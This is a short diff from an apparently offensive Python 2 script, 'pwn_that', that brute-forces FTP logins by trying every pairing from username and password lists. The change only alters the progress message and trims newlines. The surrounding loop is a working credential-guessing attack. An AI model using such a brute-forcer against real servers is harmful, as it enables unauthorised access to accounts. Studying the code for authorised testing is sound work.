@@ -105,7 +105,7 @@ def pwn_that(server,user_list, pass_list,results):
 			try:
 				ftp = ftplib.FTP(server)
 
-                                print usernames[j]+":"+passwords[i]
+                                print "[+] Trying combination "+usernames[j][:len(usernames[j])-1]+":"+passwords[i][:len(passwords[i])-1]
 
 				ftp.login(usernames[j],passwords[i])
 				print "[+] Login Found"
